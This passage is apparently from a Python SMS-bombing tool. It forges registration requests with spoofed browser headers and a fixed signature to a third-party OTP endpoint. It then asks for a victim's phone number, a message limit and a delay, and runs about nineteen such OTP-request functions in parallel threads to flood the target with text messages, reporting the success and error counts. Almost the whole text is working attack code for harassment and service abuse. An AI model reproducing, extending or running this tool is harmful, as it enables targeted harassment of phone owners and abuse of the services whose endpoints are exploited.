    header = {'Host': 'admin.skc-app.ru', 'Connection': 'keep-alive', 'Content-Length': '92', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://m.skc-invest.com', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://m.skc-invest.com/', 'Accept-Encoding': 'gzip, deflate, br'}
    body = {"account":str(number),"passwordType":"REGISTER","sign":"107ab28653558980b70627654162306c"}

    try:
        web = session.post(url, headers=header, json=body, timeout=8)
        result = json.loads(web.text)
        if debug == True:
            print(f"{web.status_code} from skc")
        if result['success'] == True:
            LIMIT += 1
            # try:
            #     sleep = result['value']['expiredMinutes']*60
            #     time.sleep(sleep)
            # except:
            #     pass
            return True
        else:
            ERROR += 1
            return False
    except Exception as e:
        ERROR += 1
        if debugError == True:
            print(f"\033[1;91mError otp19 {e}\033[1;92m")
        return False
# you can add api and put it in the box to run

# mainporcesore


def bomber(function):
    global LIMIT, RUN, LIMIT1, ERROR, SLEEP
    number = open("number.txt", "r").read()
    while bool(RUN) == True:
        if function(number):
            sys.stdout.write(u"\033[1000D\033[1;92mSuccess: \033[1;97m{} \033[1;92mError: \033[1;91m{} \033[1;92m".format(
                str(LIMIT), str(ERROR)))
            sys.stdout.flush()

            if int(LIMIT) >= int(LIMIT1):
                RUN = False
        else:
            sys.stdout.write(u"\033[1000D\033[1;92mSuccess: \033[1;97m{} \033[1;92mError: \033[1;91m{} \033[1;92m".format(
                str(LIMIT), str(ERROR)))
            sys.stdout.flush()
        time.sleep(int(SLEEP))
# picker input


def pick():
    a = input("\033[1;92m╚═════\033[1;91m>>>\033[1;97m ")
    return a

# home


def home():
    global LIMIT1, SLEEP, LIMIT
    os.system(clr)
    print(logo)
    print(line)
    print("\033[1;92m║ \033[1;94m—> \033[1;92mInput Target Number ex.09222222222")
    number = pick()
    a = open("number.txt", "w")
    a.write(str(number))
    a.close()
    print("\033[1;92m║ \033[1;94m—> \033[1;92mLIMIT")
    # all process put in the box to put in multiprocess
    function = [otp, otp1, otp2, otp3, otp4,
                otp5, otp6, otp7, otp8, otp9,
                otp11, otp12, otp13, otp14,
                otp15, otp16, otp17, otp18,
                otp19
                ]
    # append LIMIT in global variables
    LIMIT1 = pick()
    print("\033[1;92m║ \033[1;94m—> \033[1;92mThreads Sleep default:1")
    # put sleep in global variable
    # note thats why i call global for its to grant call it anyware in the system
    try:
        s = pick()
        SLEEP = s if s else 1
    except Exception as e:
        SLEEP = 1
        log_error(e)
    print(f"\033[1;92m║ \033[1;92mBombing target...")
    # defind the multiprocess
    p = ThreadPool(int(len(function)))
    # run the multiprocess
    p.map(bomber, function)
    # if bomber is finish its going here
    print("\r\r"+line2)
    print(f"\033[1;92m║ \033[1;92mTotal sms send \033[1;93m{LIMIT}")
    print(f"\033[1;92m║ \033[1;92mTotal send error \033[1;91m{ERROR}")
    print("\r\r"+line2)
    print("\033[1;92m║ Done.")


# if run main it going to home
if __name__ == "__main__":
    os.system("git pull")
    os.system(clr)
    home()
